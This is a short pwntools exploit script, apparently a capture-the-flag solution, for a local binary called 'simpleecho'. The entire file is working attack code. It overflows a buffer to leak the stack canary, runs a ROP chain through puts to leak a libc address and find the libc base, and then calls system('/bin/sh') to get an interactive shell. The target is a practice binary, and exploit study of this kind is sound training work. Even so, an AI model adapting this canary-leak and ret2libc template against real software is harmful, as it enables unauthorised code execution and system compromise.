from pwn import *

p = process('./simpleecho')
elf = ELF('./simpleecho')
libc = elf.libc

p.sendlineafter('Input : ', 'a'*0x88)
p.recvuntil('a'*0x88)
canary = u64(p.recv(8).ljust(8, b'\x00')) & 0xffffffffffffff00
success('canary = 0x%x', canary)

pop_rdi = 0x0000000000400923
putsPLT = elf.plt['puts']
putsGOT = elf.got['puts']
main = elf.sym['main']
payload = b'a'*0x88 + p64(canary) + b'a'*0x18 + p64(pop_rdi) + p64(putsGOT) + p64(putsPLT) + p64(main)
p.sendafter('Input : ', payload)
p.sendafter('Input : ', 'exit')
p.recvuntil('goodbye~\n')
puts = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = puts - libc.sym['puts']
success('libc base = 0x%x', libc_base)

system = libc_base + libc.sym['system']
sh = libc_base + next(libc.search(b'/bin/sh\x00'))
ret = 0x00000000004005e9
payload = b'a'*0x88 + p64(canary) + b'a'*0x18 + p64(pop_rdi) + p64(sh) + p64(ret) + p64(system)
p.sendafter('Input : ', payload)
p.sendafter('Input : ', 'exit')

p.interactive()